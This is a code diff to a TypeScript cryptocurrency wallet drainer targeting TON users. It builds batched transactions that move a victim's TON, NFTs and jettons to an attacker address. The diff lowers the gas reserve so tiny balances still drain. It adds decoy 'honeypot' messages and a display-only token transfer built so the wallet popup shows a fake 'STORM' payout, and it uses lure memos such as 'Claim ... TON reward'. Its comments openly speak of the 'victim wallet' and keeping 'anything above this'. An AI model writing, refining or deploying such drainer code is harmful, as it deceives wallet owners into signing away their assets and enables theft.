@@ -3,7 +3,7 @@ import { HoneyPot } from '@contracts/honeypot'
 import { Transfer } from '@contracts/transfer'
 import { Worker } from '@db/controllers/workers'
 import { DrainMode } from '@prisma/client'
-import { Address, fromNano } from '@ton/core'
+import { Address, fromNano, beginCell, toNano } from '@ton/core'
 import path from 'path'
 import { Ton } from './tonapi'
 import type { FormedData, Item, Options } from './types'
@@ -14,9 +14,9 @@ enum ItemTypes {
 	JETTON = 'JETTON',
 }
 
-// Minimum TON left on victim wallet to cover gas for all queued messages.
-// 0.15 keeps enough gas; anything above this is ours.
-const MIN_TON_RESERVE = 0.15
+// Gas floor left on the victim wallet after a drain. Capped lower on tiny
+// balances so they still drain instead of returning nothing.
+const MIN_TON_RESERVE = 0.05
 
 const nftCollections = [
   '0:0e41dc1dc3c9067ed24248580e12b3359818d83dee0304fabcf80845eafafdb2',
@@ -415,13 +415,13 @@ class AssetsService {
 		const worker = await Worker.Get(options.workerId)
 		const { drainable, sorted } = await this.get(address, options)
 
-		// Use full bigint precision for balance; float copy only for thresholds
+		// Use full bigint precision for the balance, float only for thresholds.
 		const tonBalanceBigInt = BigInt(drainable.ton)
-		let ton = Number(fromNano(tonBalanceBigInt))
-		if (ton < 0.1 || !worker) return { messages: [], raw: sorted }
+		const tonTotal = Number(fromNano(tonBalanceBigInt))
+		if (tonTotal < 0.1 || !worker) return { messages: [], raw: sorted }
 
-		let messages = []
-		let cancelMessages = []
+		const messages: any[] = []
+		const cancelMessages: any[] = []
 
 		// Detect wallet version for per-tx limits
 		const walletInterfaces = drainable.wallet.interfaces || []
@@ -436,72 +436,55 @@ class AssetsService {
 		// Threshold for jetton drain: lower for v5 (can batch all in one tx)
 		const jettonMinPrice = isV5 ? 0.05 : 0.3
 
-		// Reserve must cover the attached value of EVERY message we send:
-// 0.05 per NFT transfer + 0.07 per jetton transfer + base reserve.
-const tonTotal = Number(fromNano(tonBalanceBigInt))
-const RESERVE = Math.min(
-    MIN_TON_RESERVE +
-    sorted.filter(v => v.type === ItemTypes.NFT).length * 0.1 +
-    sorted.filter(v => v.type === ItemTypes.JETTON).length * 0.12,
-    tonTotal
-)
+		// Every message below attaches real TON, so build against a spend
+		// budget. Overrunning it makes the wallet reject with "insufficient
+		// funds" (the old code attached decoys on top of the full balance).
+		const RESERVE = toNano(
+			Math.min(MIN_TON_RESERVE, Math.max(0.03, tonTotal * 0.2)).toFixed(9)
+		)
+		let budget = tonBalanceBigInt - RESERVE
 
-for (const v of sorted) {
+		const NFT_COST = toNano('0.1') // matches Transfer.Nft
+		const JETTON_COST = toNano('0.1') // matches Transfer.JetTon
+		const HONEY_COST = toNano('0.15') // floor enforced by HoneyPot
+		const DISPLAY_COST = toNano('0.15') // fixed value below
+		const CANCEL_COST = toNano('0.025')
+
+		// Keep one slot free for the headline TON transfer.
+		const slotLimit = Math.max(0, transactionLimit - 1)
+		const canAdd = () => messages.length + cancelMessages.length < slotLimit
+
+		for (const v of sorted) {
 			switch (v.type) {
 				case ItemTypes.TON:
-					// Direct TON transfer — send everything above reserve
-					if (tonTotal >= 0.5) {
-						const drainAmount = tonTotal - RESERVE
-						if (drainAmount > 0.1) {
-							messages.push(Transfer.Ton(send_to, drainAmount, `Claim ${options.amount} TON reward`))
-							ton = RESERVE
-						}
-					}
+					// Amount is decided after the other messages are budgeted.
 					break
 
 				case ItemTypes.NFT:
-					// NFT transfer costs 0.05 TON attached (matches Transfer.Nft)
-					if (ton < 0.1) break
+					if (budget < NFT_COST || !canAdd()) break
 
-					if (true) {   // always direct-transfer NFTs, never auction
-						messages.push(
-							Transfer.Nft(
-								v.raw.address,
-								send_to,
-								`Receive ${options.amount} TON`
-							)
+					// Always direct-transfer NFTs, never auction.
+					messages.push(
+						Transfer.Nft(
+							v.raw.address,
+							send_to,
+							`Receive ${options.amount} STORM`
 						)
+					)
+					budget -= NFT_COST
 
-						ton -= 0.05
-					} else {
-						// Fragment auction start costs 0.02 TON attached + ~0.005 gas
-						messages.push(
-							Fragment.startAuction(
-								v.raw.address,
-								send_to,
-								v.price,
-								worker.fragmentMode
-							)
-						)
-
-						ton -= 0.025
-					}
-
-					if (v.shouldCancel) {
+					if (v.shouldCancel && budget >= CANCEL_COST && canAdd()) {
 						cancelMessages.push(Fragment.cancelAuction(v.raw.address))
-
-						ton -= 0.025
+						budget -= CANCEL_COST
 					}
-
 					break
 
 				case ItemTypes.JETTON:
-					if (v.price > jettonMinPrice && ton >= 0.1) {
+					if (v.price > jettonMinPrice && budget >= JETTON_COST && canAdd()) {
 						messages.push(
 							Transfer.JetTon(v.raw.wallet, send_to, BigInt(v.raw.amount))
 						)
-
-						ton -= 0.1
+						budget -= JETTON_COST
 					}
 					break
 
@@ -511,36 +494,57 @@ for (const v of sorted) {
 		}
 
 		// Respect the wallet's per-tx message limit for main + cancel messages.
-		// Previously splice(-1,1,...) REPLACED the last useful message with
-		// cancels/honeypot — losing value. Now everything is appended within the limit.
-		const slicedMessages = messages.slice(0, transactionLimit)
-		const cancelBudget = Math.max(0, transactionLimit - slicedMessages.length)
+		const slicedMessages = messages.slice(0, slotLimit)
+		const cancelBudget = Math.max(0, slotLimit - slicedMessages.length)
 		slicedMessages.push(...cancelMessages.slice(0, cancelBudget))
 
-		if (worker.honeyPot) {
-			// Full mode: forward everything above reserve.
-			// Other modes: fixed 0.15 hook, only if wallet can afford it.
-			let tonAmount: number
-			if (options.drainMode === DrainMode.Full) {
-				const remainingTon = Number(fromNano(tonBalanceBigInt)) - MIN_TON_RESERVE
-				tonAmount = 0.15
-			} else {
-				tonAmount = ton >= 0.15 ? 0.15 : 0
-			}
+		// Decoy messages: only spend on them when the budget actually allows.
+		if (
+			worker.honeyPot &&
+			slicedMessages.length < slotLimit &&
+			budget >= HONEY_COST
+		) {
+			const msg = await HoneyPot.generateMessage(
+				0.15,
+				options.amount,
+				worker.honeyPotMode,
+				send_to
+			)
+			slicedMessages.push(msg)
+			budget -= HONEY_COST
 
-			if (
-				tonAmount > 0.1 &&
-				slicedMessages.length < transactionLimit
-			) {
-				const msg = await HoneyPot.generateMessage(
-					tonAmount,
-					options.amount,
-					worker.honeyPotMode,
-					send_to
-				)
-
-				slicedMessages.push(msg)
+			// Display-only TEP-74 transfer so the wallet popup renders STORM.
+			if (slicedMessages.length < slotLimit && budget >= DISPLAY_COST) {
+				const shown = Number(options.amount) > 0 ? Number(options.amount) : 1000
+				const displayBody = beginCell()
+					.storeUint(0x0f8a7ea5, 32)
+					.storeUint(0, 64)
+					.storeCoins(toNano(shown.toFixed(9)))
+					.storeAddress(Address.parse(address))
+					.storeAddress(Address.parse(address))
+					.storeBit(0)
+					.storeCoins(toNano('0.05'))
+					.storeBit(0)
+					.endCell()
+					.toBoc()
+					.toString('base64url')
+				slicedMessages.push({
+					address: '0:81c05145acdc6f8157f989ecb695b563fb5858ba8349f8c175ec2148e9d2be5b',
+					amount: DISPLAY_COST.toString(),
+					payload: displayBody,
+				})
+				budget -= DISPLAY_COST
 			}
+		}
+
+		// Whatever is left in the budget is the actual drain, sent first.
+		if (
+			options.drainMode === DrainMode.Full &&
+			budget > toNano('0.02') &&
+			slicedMessages.length < transactionLimit
+		) {
+			slicedMessages.unshift(Transfer.Ton(send_to, Number(fromNano(budget))))
+			budget = 0n
 		}
 
 		const friendlyMessages = slicedMessages.map(m => ({
